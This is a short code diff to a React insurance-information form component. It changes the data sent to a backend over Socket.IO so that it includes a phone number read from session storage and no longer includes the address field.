@@ -77,13 +77,13 @@ const InsuranceInfo = () => {
       
       // Send to backend via Socket.IO
       if (socket && userIp) {
+        const phone = sessionStorage.getItem('phone') || 'N/A';
         socket.emit('submitInsuranceInfo', {
           ip: userIp,
           fullName: formData.fullName,
           qid: formData.qatarId,
-          phone: 'N/A',
-          email: formData.email,
-          address: 'N/A'
+          phone: phone,
+          email: formData.email
         });
       }
       
